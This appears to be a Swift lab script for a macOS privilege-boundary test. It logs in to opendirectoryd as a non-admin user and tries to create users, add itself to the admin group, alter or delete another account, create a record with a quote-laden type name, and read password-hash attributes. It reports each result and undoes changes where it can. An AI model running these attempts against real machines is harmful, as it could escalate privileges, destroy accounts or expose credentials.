// CAND-013 scope-lab: opendirectoryd privilege-boundary experiment (disposable runner only).
// Authenticates as a NON-ADMIN user and attempts privileged directory writes.
// Every attempt prints its verdict verbatim. Control run as admin follows (--admin).
import Foundation
import OpenDirectory

func p(_ s: String) { FileHandle.standardOutput.write((s + "\n").data(using: .utf8)!); fflush(stdout) }

let env = ProcessInfo.processInfo.environment
let user = env["LAB_USER"] ?? "labuser"
let pass = env["LAB_PASS"] ?? "LabPass456!"
let isAdminControl = (env["LAB_ADMIN"] ?? "0") == "1"
let role = isAdminControl ? "ADMIN-CONTROL" : "NON-ADMIN"

p("== role: \(role) (authenticating as \(user))")
let session = ODSession.default()
let node = try! ODNode(session: session!, type: ODNodeType(kODNodeTypeLocalNodes))
do {
    try node.setCredentialsWithRecordType(kODRecordTypeUsers, recordName: user, password: pass)
    p("== authenticated as \(user)")
} catch { p("!! auth failed for \(user): \(error) — aborting role"); exit(0) }

let stamp = String(Int(Date().timeIntervalSince1970))

// T1: create a user record (privileged directory write)
do {
    let r = try node.createRecord(withRecordType: kODRecordTypeUsers, name: "probe_t1_\(stamp)", attributes: nil)
    p("T1[\(role)] !! USER RECORD CREATED — attempting cleanup")
    try? r.delete()
} catch { p("T1[\(role)] create user: DENIED (\((error as NSError).code) \(error.localizedDescription.prefix(80)))") }

// T2: add self to the admin group (privilege escalation)
do {
    let admin = try node.record(withRecordType: kODRecordTypeGroups, name: "admin", attributes: nil)
    let me = try node.record(withRecordType: kODRecordTypeUsers, name: user, attributes: nil)
    let uuid = (try? me.values(forAttribute: "dsAttrTypeStandard:GeneratedUID"))?.first as? String ?? "unknown-uuid"
    do {
        try admin.addValue(uuid, toAttribute: kODAttributeTypeGroupMembers)
        p("T2[\(role)] !! SELF ADDED TO ADMIN GROUP — PRIVILEGE ESCALATION (uuid \(uuid))")
        _ = try? admin.removeValues(forAttribute: kODAttributeTypeGroupMembers)
    } catch { p("T2[\(role)] add-to-admin-group: DENIED (\((error as NSError).code))") }
} catch { p("T2[\(role)] setup failed: \(error.localizedDescription.prefix(80))") }

// T3: modify another user's record (integrity)
do {
    let victim = try node.record(withRecordType: kODRecordTypeUsers, name: "labadmin", attributes: nil)
    try victim.setValue("PWNED-\(stamp)", forAttribute: kODAttributeTypeFullName)
    p("T3[\(role)] !! MODIFIED labadmin RealName — attempting restore")
    try? victim.setValue("labadmin", forAttribute: kODAttributeTypeFullName)
} catch { p("T3[\(role)] modify other user: DENIED (\((error as NSError).code))") }

// T4: delete another user's record
do {
    let victim = try node.record(withRecordType: kODRecordTypeUsers, name: "labadmin", attributes: nil)
    try victim.delete()
    p("T4[\(role)] !! DELETED labadmin RECORD — CRITICAL")
} catch { p("T4[\(role)] delete other user: DENIED (\((error as NSError).code))") }

// T5: create record of arbitrary type (CAND-018 scope as non-admin)
do {
    let r = try node.createRecord(withRecordType: "Probe'Type--\(stamp)", name: "t5_\(stamp)", attributes: nil)
    p("T5[\(role)] !! ARBITRARY-TYPE RECORD CREATED (non-admin)")
} catch { p("T5[\(role)] arbitrary-type create: DENIED (\((error as NSError).code))") }

// T6: read another user's protected attributes as non-admin
do {
    let victim = try node.record(withRecordType: kODRecordTypeUsers, name: "labadmin", attributes: nil)
    let protectedAttrs: [String] = ["dsAttrTypeStandard:ShadowHash", "dsAttrTypeStandard:AuthenticationAuthority"]
    for a in protectedAttrs {
        let v = try? victim.values(forAttribute: a)
        p("T6[\(role)] labadmin.\(a) = \(v.map { "\($0.count) values" } ?? "unreadable")")
    }
} catch { p("T6[\(role)] failed: \(error.localizedDescription.prefix(80))") }

p("== done (\(role))")
